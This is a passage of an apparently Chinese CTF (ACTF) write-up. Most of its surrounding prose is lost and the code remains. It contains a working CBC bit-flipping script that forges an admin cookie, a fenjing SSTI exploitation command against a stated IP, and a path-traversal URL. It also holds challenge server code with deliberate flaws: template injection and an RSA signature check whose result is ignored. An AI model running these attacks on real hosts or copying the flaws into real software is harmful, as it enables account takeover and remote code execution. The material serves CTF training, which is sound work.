app.run()</span><br></pre></td></tr></table></figure><p><code>admin</code><strong></strong><code>ChatGPT</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip_bytes</span>(<span class="params">cookie_b: <span class="built_in">bytes</span>, offset: <span class="built_in">int</span>, orig: <span class="built_in">bytes</span>, target: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">     cookie  offset IV </span></span><br><span class="line"><span class="string">    new_byte = old_byte XOR (orig_byte XOR target_byte)</span></span><br><span class="line"><span class="string">    orig  target </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig) != <span class="built_in">len</span>(target):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># cookie_b = IV || C1 || C2 || ...   16 </span></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    block_index = offset // BLOCK_SIZE</span><br><span class="line">    byte_index = offset % BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  block_index==0  IV</span></span><br><span class="line">    <span class="keyword">if</span> block_index == <span class="number">0</span>:</span><br><span class="line">        mod_block_start = <span class="number">0</span>  <span class="comment"># IV  16 </span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        mod_block_start = block_index * BLOCK_SIZE - BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">    mod_block = <span class="built_in">bytearray</span>(</span><br><span class="line">        cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(orig)):</span><br><span class="line">        pos_in_block = byte_index + i</span><br><span class="line">        <span class="keyword">if</span> pos_in_block &gt;= BLOCK_SIZE:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment">#  old_byte</span></span><br><span class="line">        old_byte = mod_block[pos_in_block]</span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        diff = orig[i] ^ target[i]</span><br><span class="line">        mod_block[pos_in_block] = old_byte ^ diff</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  cookie_b </span></span><br><span class="line">    cookie_b = <span class="built_in">bytearray</span>(cookie_b)</span><br><span class="line">    cookie_b[mod_block_start: mod_block_start + BLOCK_SIZE] = mod_block</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cookie_b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_username_offset</span>(<span class="params">plaintext: <span class="built_in">str</span>, username: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">     username  plaintext </span></span><br><span class="line"><span class="string">    plaintext  cookie  JSON </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pos = plaintext.find(username)</span><br><span class="line">    <span class="keyword">if</span> pos == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> pos</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simulate_plaintext</span>(<span class="params">orig_username: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">     JSON </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#  register_time  password_raw </span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: orig_username,</span><br><span class="line">        <span class="string">&quot;password_raw&quot;</span>: <span class="string">&quot;dummy&quot;</span>,</span><br><span class="line">        <span class="string">&quot;register_time&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;: &#123;&#125; &lt;cookie_base64&gt; &lt;orig_username&gt; &lt;target_username&gt;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;: &#123;&#125; &lt;cookie_str&gt; aaaaa admin&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    cookie_base64 = sys.argv[<span class="number">1</span>]</span><br><span class="line">    orig_username = sys.argv[<span class="number">2</span>].encode()</span><br><span class="line">    target_username = sys.argv[<span class="number">3</span>].encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(orig_username) != <span class="built_in">len</span>(target_username):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  cookie</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_bytes = base64.b64decode(cookie_base64)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cookie: &quot;</span>, e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    plaintext_sim = simulate_plaintext(orig_username.decode())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        offset = find_username_offset(plaintext_sim, orig_username.decode())</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>, offset)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  cookie </span></span><br><span class="line">    cookie_modified = flip_bytes(</span><br><span class="line">        cookie_bytes, offset, orig_username, target_username)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#  cookie</span></span><br><span class="line">    new_cookie_base64 = base64.b64encode(cookie_modified).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; cookie&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(new_cookie_base64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>aaaaa</code><code>cookie</code><strong></strong><code>123456</code><br /><img src="https://picx.zhimg.com/80/v2-7f037ed155981a1710249bc6025d9d52_1440w.png" alt="" /><br /><code>SSTI</code><strong>fenjing</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">GET /home?payload=PAYLOAD HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span></span><br><span class="line">Referer: http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">63789</span>/login</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">135.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Cookie: jwbcookie=2nRR2vOrnDt+vcwOrbWN3f8SGG1kNMmek6VPEE7iZeu9EI9LY9V+cjXoKdh6r4IvaPCzi3AGKY+tlfr1HdEgjxsy5IANc9hX3VCnN66pvQiCM2xu1aHzHAVzHSYAr2qX</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>python3 -m fenjing crack-request -f http.txt --host 61.147.171.105 --port 63789</strong></p><p><strong>ACTF{n3vEr_imPlem3nT_SuCh_Iv_HIJacK4bl3_C00Kie}</strong></p><p><code>wsl2</code><code>win</code></p><h2 id="not-so-web-2"><a class="markdownIt-Anchor" href="#not-so-web-2"></a> not so web 2</h2><blockquote><p></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, json, time</span><br><span class="line"><span class="keyword">import</span> os, sys, binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">    abort,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>):</span><br><span class="line">    private_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    private_key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    valid, _ = parse_cookie(cookie_b64)</span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie_b64:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie = base64.b64decode(cookie_b64, validate=<span class="literal">True</span>).decode()</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg_str, sig_hex = cookie.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    msg_dict = json.loads(msg_str)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = <span class="built_in">bytes</span>.fromhex(sig_hex)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    msg_dict = &#123;<span class="string">&quot;user_name&quot;</span>: user.name, <span class="string">&quot;login_time&quot;</span>: <span class="built_in">int</span>(time.time())&#125;</span><br><span class="line">    msg_str = json.dumps(msg_dict)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)</span><br><span class="line">    sig_hex = sig.<span class="built_in">hex</span>()</span><br><span class="line">    packed = msg_str + <span class="string">&quot;&amp;&quot;</span> + sig_hex</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(packed.encode()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> payload:</span><br><span class="line">            <span class="keyword">for</span> char <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&quot;&#x27;_#&amp;;&quot;</span>:</span><br><span class="line">                    abort(<span class="number">403</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><code>RSA</code><code>wp</code></p><p><code>parse_cookie()</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">    valid = <span class="literal">True</span></span><br><span class="line"><span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br></pre></td></tr></table></figure><p>1<strong>PKCS#1_v1.5</strong><code>PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</code><strong>True</strong><strong></strong><strong></strong><code>admin</code><code>valid = True</code></p><p></p><h2 id="actf-upload"><a class="markdownIt-Anchor" href="#actf-upload"></a> ACTF upload</h2><p><code>base64</code></p><p><code>Python</code><code>/upload?file_path=../../../app/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, flash, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.getenv(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;upload&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest() == <span class="string">&#x27;32783cef30bc23d9549623aa48aa8556346d78bd3ca604f277d63d6e573e8ce0&#x27;</span>:</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> 